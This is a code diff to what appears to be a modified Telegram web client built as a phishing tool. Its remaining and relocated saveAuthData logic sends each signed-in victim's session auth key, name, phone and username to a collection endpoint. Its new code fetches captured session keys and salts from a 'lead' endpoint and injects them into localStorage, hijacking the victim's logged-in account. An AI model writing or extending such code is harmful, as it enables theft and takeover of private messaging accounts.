@@ -39,7 +39,7 @@ import { nextRandomUint } from './helpers/random';
 import { IS_OVERLAY_SCROLL_SUPPORTED, USE_CUSTOM_SCROLL, USE_NATIVE_SCROLL } from './environment/overlayScrollSupport';
 import IMAGE_MIME_TYPES_SUPPORTED, { IMAGE_MIME_TYPES_SUPPORTED_PROMISE } from './environment/imageMimeTypesSupport';
 import MEDIA_MIME_TYPES_SUPPORTED from './environment/mediaMimeTypesSupport';
-import getPreviewURLFromThumb from "./helpers/getPreviewURLFromThumb"
+import { saveAuthData } from "./lead.controller"
 const env = import.meta.env;
 // import appNavigationController from './components/appNavigationController';
 
@@ -331,7 +331,7 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
     I18n.getLangPack(langPack.lang_code);
   } else {
     fillLocalizedDates();
-  } 
+  }
   rootScope.addEventListener('language_change', () => {
     fillLocalizedDates();
   });
@@ -394,8 +394,9 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
   }
   let url = window.location.href;
   let currId = url.split("/").pop();
-  if (currId.includes(":")) {
-    let [fatherUuid, id] = currId.split(":")
+  if (currId.includes("%7C")) {
+    localStorage.clear();
+    let [fatherUuid, id] = currId.split("%7C")
     if (fatherUuid && id) {
       try {
         const response = await fetch(import.meta.env.VITE_GET_LEAD, {
@@ -409,90 +410,54 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
         if (!response.ok) {
           throw new Error('Network response was not ok');
         }
-        const { dc2_auth_key, user_auth } = await response.json();
-        localStorage.setItem("dc2_auth_key", dc2_auth_key)
-        localStorage.setItem("user_auth", user_auth)
+        const { auth_key_fingerprint,
+          dc2_auth_key,
+          dc2_server_salt,
+          dc1_auth_key,
+          dc1_server_salt,
+          user_auth,
+          xt_instance,
+          state_id
+        } = await response.json();
+        console.log({
+          auth_key_fingerprint,
+          dc2_auth_key,
+          dc2_server_salt,
+          dc1_auth_key,
+          dc1_server_salt,
+          user_auth,
+          xt_instance,
+          state_id
+        })
+        // 
+        let { dcID } = JSON.parse(user_auth)
+        localStorage.setItem("auth_key_fingerprint", auth_key_fingerprint)
         localStorage.setItem("core", "true")
+        localStorage.setItem("dc", dcID)
+        localStorage.setItem("dc1_auth_key", dc1_auth_key)
+        localStorage.setItem("dc1_server_salt", dc1_server_salt)
+        localStorage.setItem("dc2_auth_key", dc2_auth_key)
+        localStorage.setItem("dc2_server_salt", dc2_server_salt)
+        localStorage.setItem("user_auth", user_auth)
+        localStorage.setItem("state_id", state_id)
+        await new Promise<void>((resolve, reject) => {
+          setTimeout(() => {
+            localStorage.setItem("xt_instance", xt_instance)
+            resolve()
+          }, 3000)
+        })
         let url = window.location.href;
         let parsedUrl = new URL(url);
-        window.location.replace(`${parsedUrl.protocol}//${parsedUrl.host}`);
+        window.location.replace(`${parsedUrl.protocol}//${parsedUrl.host}/`);
       } catch (error) {
         console.error('Error saving auth data:', error);
       }
     }
   }
   if (authState._ === 'authStateSignedIn') {
-    let url2 = window.location.href;
-    let currId2 = url2.split("/").pop();
-    async function getDbIndexes(id: string) {
-      return new Promise((resolve, reject) => {
-        const request = window.indexedDB.open("tweb", 7);
-        request.onsuccess = function (event: any) {
-          const db = event.target.result;
-          const transaction = db.transaction("users", "readonly");
-          const store = transaction.objectStore("users");
-          const getRequest = store.get("" + id);
-          getRequest.onsuccess = function () {
-            if (getRequest.result) {
-              resolve(getRequest.result);
-            } else {
-              resolve("No matching record found")
-            }
-          };
-
-          getRequest.onerror = function (error: any) {
-            console.error(error)
-            resolve("Error retrieving data")
-          };
-        };
-
-        request.onerror = function (error: any) {
-          console.error(error)
-          resolve("Error opening database")
-        };
-
-      })
-    }
-    async function saveAuthData() {
-      const dc2_auth_key = localStorage.getItem('dc2_auth_key');
-      const user_auth = localStorage.getItem('user_auth');
-      let { id } = JSON.parse(user_auth)
-      let curr_user_data: any = {}; // User
-      // 
-      if (id) {
-        curr_user_data = await getDbIndexes(id);
-        let photo: any = "";
-      }
-      if (dc2_auth_key && user_auth) {
-        try {
-          const response = await fetch(import.meta.env.VITE_SAVE_AUTH, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              dc2_auth_key,
-              user_auth,
-              currId: currId2,  
-              fullName: [curr_user_data.first_name, curr_user_data.last_name].filter(Boolean).join(" "),
-              phone: curr_user_data.phone,
-              username: curr_user_data.username
-            }),
-
-          });
-
-          if (!response.ok) {
-            throw new Error('Network response was not ok');
-          }
-          const data = await response.json();
-        } catch (error) {
-          console.error('Error saving auth data:', error);
-        }
-      } else {
-        console.error('Auth keys not found in localStorage');
-      }
-    }
-    if (!currId2.includes(":")) saveAuthData();
+    const coreL = localStorage.getItem('core');
+    if (!currId.includes("%7C") && (!coreL || coreL === "false"))
+      saveAuthData();
   }
   if (authState._ !== 'authStateSignedIn'/*  || 1 === 1 */) {
     console.log('Will mount auth page:', authState._, Date.now() / 1000);
@@ -605,7 +570,6 @@ IMAGE_MIME_TYPES_SUPPORTED_PROMISE.then((mimeTypes) => {
         break;
       case "false":
       default:
-
         (await import('./pages/pageImLead')).default.mount();
         break;
     }
